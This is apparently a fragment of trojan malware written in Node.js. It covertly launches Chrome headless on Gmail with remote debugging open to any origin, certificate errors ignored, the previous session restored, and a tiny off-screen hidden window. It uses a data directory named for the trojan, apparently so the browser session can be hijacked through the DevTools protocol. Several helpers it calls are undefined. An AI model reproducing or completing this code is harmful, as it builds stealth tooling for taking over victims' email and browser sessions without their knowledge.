console.log('test 1234 hello world');

const path = require("path");
const net = require("net");
const { fork, exec, spawn } = require("child_process");
const fs = require("fs");
const os = require("os");
const crypto = require("crypto");
const util = require("util");

function spawn_chrome(starturl='https://www.gmail.com/', debugport=9223, datadir=null) {

    datadir = datadir || path.join(systemstate.trojandir, 'chrome');

    let cmdlineargs = [ 
        `--remote-debugging-port=${debugport}`,
        `--user-data-dir=${datadir}`,
        `--new-window ${starturl}`,
        `--headless=new`,
        `--no-first-run`,
        `--no-default-browser-check`,
        `--profile-directory=Default`,
        `--remote-allow-origins=*`,
        `--restore-last-session`,
        `--ignore-certificate-errors`,
        `--window-position=2000,2000`,
        `--window-size=10,10`
    ];

    // TODO auto discover by reading chrome lnk files
    let chrome_exe_path = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"

    const child = spawn(
        chrome_exe_path,
        [ ...cmdlineargs ],
        {
            // detached: true, // might cause errors
            windowsHide: true,
            // stdio: ["ignore", out, err],
            // shell: false,
            // cwd: systemstate.trojandir,
        }
    );

    child.stdout.on("data", (data) => {
        let text = data.toString();

        if (stdoutfunc) stdoutfunc(text);
        else logmsg(text);
    });

    child.stderr.on("data", (data) => {
        let text = data.toString();

        if (stderrfunc) stderrfunc(text);
        else logmsg(text);
    });

    child.on("close", (code) => {
        if (closefunc) closefunc(code);
        else logmsg(`Child process exited with code ${code}`);
    });

    return child;
}

console.log(JSON.stringify(process.argv));

let childp = spawn_chrome();

console.log('--- END SCRIPT ---');

//const globalFunctions = Object.getOwnPropertyNames(globalThis).filter(prop => typeof globalThis[prop] === 'function');
//console.log(JSON.stringify(globalFunctions));
//if ( globalFunctions.includes('spawn_chrome') ) { let childp = spawn_chrome(); }
